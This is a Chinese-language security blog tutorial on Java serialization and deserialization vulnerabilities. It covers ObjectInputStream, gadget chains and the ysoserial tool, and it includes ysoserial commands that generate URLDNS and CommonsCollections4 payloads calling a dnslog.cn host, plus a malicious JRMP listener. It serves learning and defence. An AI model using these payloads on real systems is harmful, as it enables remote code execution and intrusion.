---
title: Java反序列化
author: Creexile
date: 2025-08-05
lastMod: 2025-08-05
summary: '有些东西通过击打才能正常工作,比如电脑'
cover: ''
category: 'Java安全'
draft: false
comments: false
sticky: 0
tags: [Java, 反序列化]
---

参考文章

1. [博客园-Java反序列化初探+URLDNS链](https://www.cnblogs.com/1vxyz/p/17231164.html)

# 介绍

Java 序列化是将 Java 对象转换为字节流的过程, 以便在网络上传输或者将对象保存到磁盘文件中; Java 反序列化则是将字节流反转回 Java 对象的过程, 以便在程序中使用这些对象

Java 序列化和反序列化的过程使用 `ObjectOutputStream` 和 `ObjectInputStream` 这两个类来实现;

序列化过程中, 将需要序列化的对象写入 `ObjectOutputStream` 中, 并通过网络或文件等途径传输或保存; 反序列化过程中则将字节流读入 `ObjectInputStream` 中，并通过类型转换得到原始对象

需要注意的是, 在进行序列化和反序列化时, 对象所对应的类需要实现 Java 序列化接口 Serializable, 否则会抛出序列化异常

# 代码编写

不知道原理会用也只是脚本小子

## 例子

该程序会在当前目录下创建名为`person.ser`的文件, 里面保存着序列化后的对象; 然后程序从文件中读取序列化的对象, 将其反序列化成一个`Person`对象, 最后输出这个对象的属性

```java
import java.io.*;

public class SerializationExample {
    public static void main(String[] args) {

        // 创建一个对象
        Person person = new Person("Alice", 25);

        // 将对象序列化到文件
        try {
            FileOutputStream fileOut = new FileOutputStream("person.ser");
            ObjectOutputStream out = new ObjectOutputStream(fileOut);
            out.writeObject(person);
            out.close();
            fileOut.close();
            System.out.println("Serialized data is saved in person.ser");
        } catch (IOException e) {
            e.printStackTrace();
        }

        // 从文件读取序列化的对象
        try {
            FileInputStream fileIn = new FileInputStream("person.ser");
            ObjectInputStream in = new ObjectInputStream(fileIn);
            Person deserializedPerson = (Person) in.readObject();
            in.close();
            fileIn.close();
            System.out.println("Deserialized data:");
            System.out.println("Name: " + deserializedPerson.getName());
            System.out.println("Age: " + deserializedPerson.getAge());
        } catch (IOException e) {
            e.printStackTrace();
        } catch (ClassNotFoundException e) {
            e.printStackTrace();
        }
    }
}

// 可序列化的类
class Person implements Serializable {
    private String name;
    private int age;

    public Person(String name, int age) {
        this.name = name;
        this.age = age;
    }

    public String getName() {
        return name;
    }

    public int getAge() {
        return age;
    }
}
```

## 编写一个可以序列化的类

你已经发现了Person这个可以序列化的类实现了`Serializable`接口; 在Java当中,如果一个类需要被序列化和反序列化 ,需要实现`java.io.Serializable`接口

被transient修饰的属性不参与序列化过程, 属性设置为static的同样不参与

```java
private static final long serialVersionUID = 1L;
private transient String name;
```

## 如何进行序列化和反序列化

Java原生实现了一套序列化的机制,它让我们不需要额外编写代码,只需要实现`java.io.Serializable`接口,并调用ObjectOutputStream类的`writeObject`方法即可

```java
package test;

import java.io.FileOutputStream;
import java.io.IOException;
import java.io.ObjectOutputStream;

public class serialize {
    public static void main(String[] args) throws IOException {
        //生成Person对象的实例
        Person person = new Person("1vxyz", 18);

        // 序列化的类
        ObjectOutputStream obj = new ObjectOutputStream(new FileOutputStream("ser.ser"));

        // 需要序列化的对象是谁?
        obj.writeObject(person);
        obj.close();
    }
}

```

反序列化同样

```java
package test;

import java.io.FileInputStream;
import java.io.IOException;
import java.io.ObjectInputStream;

public class unserialize {
    public static void main(String[] args) throws IOException, ClassNotFoundException {
        // 反序列化的类
        ObjectInputStream ois = new ObjectInputStream((new FileInputStream("ser.ser")));
        // 读出来并反序列化
        Person person = (Person) ois.readObject();
        System.out.println(person);
        ois.close();
    }
}


```

## serialVersionUID

同加解密, 如果两边的算法不一样是无法恢复明文的

同样在Java中与协议相对的概念为serialVersionUID, 当serialVersionUID不一致时,反序列化会直接抛出异常

# 漏洞

## 漏洞成因

java反序列化漏洞的关键出现在`java.io.ObjectInputStream.readObject()`上，反序列化会尝试执行反序列化的类的`readObject`方法，如果这个类重写了`readObject`方法，错误的调用了一些危险方法，则会造成漏洞

## 可能的形式

1. 入口类的`readObject`直接调用危险方法
2. 入口类参数中包含可控类,该类有危险方法,`readObject`时调用
3. 入口类参数中包含可控类,该类又调用其他有危险方法的类,`readObject`时调用
   比如类型定义为 Object, 调用`equals/hashcode/toString`相同类型, 同名函数
4. 构造函数/静态代码块等类加载时隐式执行

# 学习工具

[github-ysoserial](https://github.com/frohoff/ysoserial)

## 利用

Java反序列化和php相同的是，php反序列化通过POP链最终要找到一个落脚点（RCE），这个落脚点一般都是开发自己写的。java通过gadget也要找一个落脚点触发恶意链，而这个落脚点在java标准库和一些常用库就有

> 在Java安全领域，Gadget指的是一系列在目标应用的ClassPath中已存在的类的有机组合, 也就是调用链

ysoserial上就集成了各种常用gadget，其中最简单的就是URLDNS

用法：`java -jar ysoserial.jar` 就可以看到有哪些gadget，它们适合的扩展库或者JDK版本

利用工具构造出一个恶意反序列化文件，来进行DNS查询

去DNSlog申请一个域名

```bash
java -jar ysoserial.jar URLDNS "http://1bvloh.dnslog.cn" > ser.ser
```

执行后就能在DNSlog中看到访问

```java
import java.io.FileInputStream;
import java.io.IOException;
import java.io.ObjectInputStream;

public class unserialize {
    public static void main(String[] args) throws IOException, ClassNotFoundException {
        // 反序列化的类
        ObjectInputStream ois = new ObjectInputStream((new FileInputStream("ser.ser")));
        // 读出来并反序列化
        ois.readObject();
        ois.close();
    }
}

```

其他比如更常用的CommonsCollections4

```bash
java -jar ysoserial.jar CommonsCollections4 "ping dnslog.cn"
```

起一个恶意RMI服务，一旦有人连接它，就发送恶意反序列化字节的payload

```bash
java -cp ysoserial.jar ysoserial.exploit.JRMPListener 5555 CommonsCollections4 "ping dnslog.cn"
```

# 拓展

## 定义

因为之前学的php反序列化仅有一种固定的格式, 就将序列化和反序列化理解为将文件中的代码转换为一种更易存储的字符串

现在看到java中各种第三方组件, 序列化和反序列化不再有一种固定格式, 那么这个定义就要更新了

我对它的定义为:
序列化 是将数据转换为一种更易传输和存储的格式
反序列化 将数据从这种格式中还原

> 看起来像是加密和解密啊

比如下面这些都算序列化和反序列化

```
- JAVA内置的writeObject()/readObject()
- JAVA内置的XMLDecoder()/XMLEncoder
- XStream
- SnakeYaml
- FastJson
- Jackson
```

## 风险组件

- Apache Shiro
- Apache Axis
- Weblogic
- Jboss
- Fastjson
